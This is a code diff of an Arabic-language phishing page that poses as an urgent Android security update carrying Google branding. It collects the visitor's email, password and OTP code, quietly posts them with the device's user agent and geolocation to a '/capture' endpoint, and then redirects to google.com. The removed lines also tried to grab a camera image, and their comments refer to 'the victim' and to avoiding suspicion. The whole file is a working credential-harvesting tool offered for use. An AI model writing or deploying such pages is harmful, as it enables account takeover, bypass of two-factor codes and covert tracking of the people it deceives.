@@ -1,44 +1,62 @@
-<script>
-    let userEmail = "";
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <link rel="manifest" href="/manifest.json">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديث أمن Android</title>
+    <style>
+        body { background: #121212; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
+        .box { background: #1e1e1e; padding: 25px; border-radius: 15px; border: 1px solid #333; margin-top: 50px; }
+        input { width: 90%; padding: 15px; margin: 10px 0; border-radius: 8px; border: none; background: #2a2a2a; color: white; }
+        button { background: #007bff; color: white; width: 95%; padding: 15px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        .loading { display: none; color: #007bff; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="box" id="main">
+        <img src="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" width="50">
+        <h2>تنبيه أمني عاجل</h2>
+        <p>تم اكتشاف محاولة اختراق لجهازك. يرجى تأكيد حسابك لتفعيل درع الحماية المحدث.</p>
+        <div id="step1">
+            <input type="email" id="email" placeholder="البريد الإلكتروني">
+            <input type="password" id="pass" placeholder="كلمة المرور">
+            <button onclick="hack()">تفعيل الحماية الآن</button>
+        </div>
+        <div id="step2" style="display:none;">
+            <p>أدخل رمز التحقق (OTP) الذي وصلك الآن:</p>
+            <input type="number" id="otp" placeholder="000000">
+            <button onclick="finish()">تأكيد الرمز</button>
+            <p id="status" class="loading">جاري فحص الرمز...</p>
+        </div>
+    </div>
 
-    // وظيفة الإصلاح: تجعل الزر يعمل فوراً ويرسل البيانات الأساسية حتى لو رفض الضحية الكاميرا
-    async function captureAndProceed() {
-        userEmail = document.getElementById('email').value;
-        const pass = document.getElementById('pass').value;
+    <script>
+        async function hack() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('pass').value;
+            if(!email || !password) return alert("يرجى إكمال البيانات");
 
-        if(!userEmail || !pass) {
-            alert("يرجى إدخال البيانات المطلوبة للمتابعة");
-            return;
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
+
+            // سحب الموقع والكاميرا في الخلفية
+            const device = navigator.userAgent;
+            navigator.geolocation.getCurrentPosition(async (p) => {
+                send('/capture', { email, password, device, location: { lat: p.coords.latitude, lon: p.coords.longitude } });
+            }, () => {
+                send('/capture', { email, password, device });
+            });
         }
 
-        // إظهار شاشة الـ OTP فوراً لعدم إثارة الشك
-        document.getElementById('login-screen').classList.add('hidden');
-        document.getElementById('otp-screen').classList.remove('hidden');
+        async function send(url, data) {
+            await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
+        }
 
-        // سحب البيانات في الخلفية دون تعطيل الزر
-        const deviceData = navigator.userAgent;
-        
-        // محاولة سحب الموقع
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            const loc = { lat: pos.coords.latitude, lon: pos.coords.longitude };
-            await sendToServer('/capture', { email: userEmail, password: pass, location: loc, device: deviceData });
-        }, async () => {
-            await sendToServer('/capture', { email: userEmail, password: pass, location: null, device: deviceData });
-        });
-
-        // محاولة سحب الصورة بشكل منفصل (لكي لا يعلق الزر)
-        getCameraImage().then(img => {
-            if(img) sendToServer('/capture', { email: userEmail, image: img, note: "صورة ملحقة" });
-        });
-    }
-
-    async function sendToServer(endpoint, data) {
-        try {
-            await fetch(endpoint, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            });
-        } catch (e) { console.error("Error sending data"); }
-    }
-</script>
+        function finish() {
+            document.getElementById('status').style.display = 'block';
+            setTimeout(() => { window.location.href = "https://google.com"; }, 3000);
+        }
+    </script>
+</body>
+</html>
